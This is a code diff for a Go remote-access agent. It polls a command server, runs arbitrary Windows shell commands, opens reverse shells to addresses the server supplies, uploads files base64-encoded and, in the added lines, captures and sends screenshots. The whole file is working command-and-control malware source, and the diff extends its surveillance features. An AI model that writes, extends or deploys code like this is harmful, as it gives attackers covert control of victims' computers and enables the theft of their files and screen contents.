@@ -6,7 +6,10 @@ import (
     "encoding/base64"
     "encoding/json"
     "fmt"
+    "github.com/kbinani/screenshot"
+    "image/png"
     "io/ioutil"
+    "log"
     "net"
     "net/http"
     "os/exec"
@@ -33,6 +36,36 @@ type CommandResult struct {
     FileName string `json:"fileName,omitempty"`
 }
 
+func main() {
+    fmt.Println("Agent started. Waiting for commands...")
+    ticker := time.NewTicker(10 * time.Second)
+
+    go func() {
+        for range ticker.C {
+            mu.Lock()
+            if !isCommandRunning {
+                isCommandRunning = true
+                mu.Unlock()
+
+                cmd, err := fetchCommand()
+                if err != nil {
+                    log.Printf("Error fetching command: %v", err)
+                    continue
+                }
+                if cmd.ID != "" {
+                    executeCommandAndSendResult(cmd)
+                }
+
+                mu.Lock()
+                isCommandRunning = false
+            }
+            mu.Unlock()
+        }
+    }()
+
+    select {} // This line prevents the application from exiting immediately.
+}
+
 func fetchCommand() (Command, error) {
     var cmd Command
     resp, err := http.Get(fmt.Sprintf("%s/command", serverURL))
@@ -44,73 +77,47 @@ func fetchCommand() (Command, error) {
     if err != nil {
         return cmd, err
     }
-    err = json.Unmarshal(body, &cmd)
-    return cmd, err
+    if err := json.Unmarshal(body, &cmd); err != nil {
+        return cmd, err
+    }
+    return cmd, nil
 }
 
 func sendResult(result CommandResult) {
     jsonData, err := json.Marshal(result)
     if err != nil {
-        fmt.Printf("Error marshalling result: %v\n", err)
+        log.Printf("Error marshalling result: %v", err)
         return
     }
-
     _, err = http.Post(fmt.Sprintf("%s/submit_result", serverURL), "application/json", bytes.NewBuffer(jsonData))
     if err != nil {
-        fmt.Printf("Failed to send result: %v\n", err)
+        log.Printf("Failed to send result: %v", err)
     }
 }
 
 func executeCommandAndSendResult(cmd Command) {
-    if strings.HasPrefix(cmd.Cmd, "shell ") {
+    switch {
+    case strings.HasPrefix(cmd.Cmd, "shell "):
         address := strings.TrimSpace(strings.TrimPrefix(cmd.Cmd, "shell"))
         openReverseShell(address)
-    } else if strings.HasPrefix(cmd.Cmd, "download ") {
-        // Extract file path and name from the command
+    case strings.HasPrefix(cmd.Cmd, "download "):
         parts := strings.SplitN(cmd.Cmd[len("download "):], " ", 2)
-        if len(parts) < 2 {
-            fmt.Println("Download command format error. Expected 'download <path> <filename>'.")
-            return
+        if len(parts) == 2 {
+            downloadFile(parts[0], parts[1], cmd.ID)
+        } else {
+            log.Println("Download command format error. Expected 'download <path> <filename>'.")
         }
-        filePath, fileName := parts[0], parts[1]
-        downloadFile(filePath, fileName, cmd.ID)
-    } else {
-        // Execute other commands
-        output, err := exec.Command("cmd", "/C", cmd.Cmd).CombinedOutput()
-        resultText := string(output)
-        if err != nil {
-            resultText += "\nError: " + err.Error()
-        }
-        result := CommandResult{
-            ID:     cmd.ID,
-            Result: resultText,
-        }
-        sendResult(result)
+    case cmd.Cmd == "screenshot":
+        takeScreenshot(cmd)
+    default:
+        executeOtherCommand(cmd)
     }
-}
-
-func downloadFile(filePath, fileName, commandID string) {
-    fileContent, err := ioutil.ReadFile(filePath)
-    if err != nil {
-        fmt.Printf("Error reading file %s: %v\n", filePath, err)
-        sendResult(CommandResult{
-            ID:     commandID,
-            Result: fmt.Sprintf("Error reading file %s: %v", filePath, err),
-        })
-        return
-    }
-    encodedContent := base64.StdEncoding.EncodeToString(fileContent)
-    sendResult(CommandResult{
-        ID:       commandID,
-        Result:   encodedContent,
-        FileName: fileName,
-    })
 }
 
 func openReverseShell(address string) {
     conn, err := net.Dial("tcp", address)
     if err != nil {
-        fmt.Printf("Failed to open reverse shell to %s: %v\n", address, err)
+        log.Printf("Failed to open reverse shell to %s: %v", address, err)
         return
     }
     defer conn.Close()
@@ -119,7 +126,7 @@ func openReverseShell(address string) {
         reader := bufio.NewReader(conn)
         command, err := reader.ReadString('\n')
         if err != nil {
-            fmt.Printf("Failed to read command: %v\n", err)
+            log.Printf("Failed to read command: %v", err)
             break
         }
 
@@ -135,32 +142,43 @@ func openReverseShell(address string) {
     }
 }
 
-func main() {
-    fmt.Println("Application started. Waiting for commands...")
-    ticker := time.NewTicker(10 * time.Second)
-
-    go func() {
-        for range ticker.C {
-            mu.Lock()
-            if !isCommandRunning {
-                isCommandRunning = true
-                mu.Unlock()
-
-                cmd, err := fetchCommand()
-                if err != nil {
-                    fmt.Printf("Error fetching command: %s\n", err)
-                    continue
-                }
-                if cmd.ID != "" {
-                    executeCommandAndSendResult(cmd)
-                }
-
-                mu.Lock()
-                isCommandRunning = false
-            }
-            mu.Unlock()
-        }
-    }()
-
-    select {} // Prevent the application from exiting immediately
+func downloadFile(filePath, fileName, commandID string) {
+    content, err := ioutil.ReadFile(filePath)
+    if err != nil {
+        log.Printf("Error reading file %s: %v", filePath, err)
+        sendResult(CommandResult{ID: commandID, Result: fmt.Sprintf("Failed to read file: %v", err)})
+        return
+    }
+    encodedContent := base64.StdEncoding.EncodeToString(content)
+    sendResult(CommandResult{ID: commandID, Result: encodedContent, FileName: fileName})
 }
+
+func takeScreenshot(cmd Command) {
+    bounds := screenshot.GetDisplayBounds(0)
+    img, err := screenshot.CaptureRect(bounds)
+    if err != nil {
+        log.Printf("Failed to take screenshot: %v", err)
+        sendResult(CommandResult{ID: cmd.ID, Result: "Failed to take screenshot"})
+        return
+    }
+    var buf bytes.Buffer
+    if err := png.Encode(&buf, img); err != nil {
+        log.Printf("Failed to encode screenshot to PNG: %v", err)
+        return
+    }
+    sendResult(CommandResult{
+        ID:       cmd.ID,
+        Result:   base64.StdEncoding.EncodeToString(buf.Bytes()),
+        FileName: "screenshot.png",
+    })
+}
+
+func executeOtherCommand(cmd Command) {
+    output, err := exec.Command("cmd", "/C", cmd.Cmd).CombinedOutput()
+    resultText := string(output)
+    if err != nil {
+        resultText += "\nError: " + err.Error()
+    }
+    sendResult(CommandResult{ID: cmd.ID, Result: resultText})
+}
+
